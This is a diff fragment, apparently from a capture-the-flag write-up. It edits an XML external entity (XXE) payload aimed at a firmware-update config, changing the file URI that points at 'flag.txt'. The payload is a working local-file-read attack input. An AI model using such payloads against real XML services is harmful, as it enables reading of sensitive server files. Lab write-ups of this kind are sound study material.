@@ -16,7 +16,7 @@ Created a XML payload for the file flag.txt:
 
 <?xml version="1.0" standalone="yes"?>
 <!DOCTYPE test [
-<!ENTITY xxe SYSTEM "file:///flag.txt">
+<!ENTITY xxe SYSTEM "file://flag.txt">
 ]>
 <FirmwareUpdateConfig>
 <Firmware>
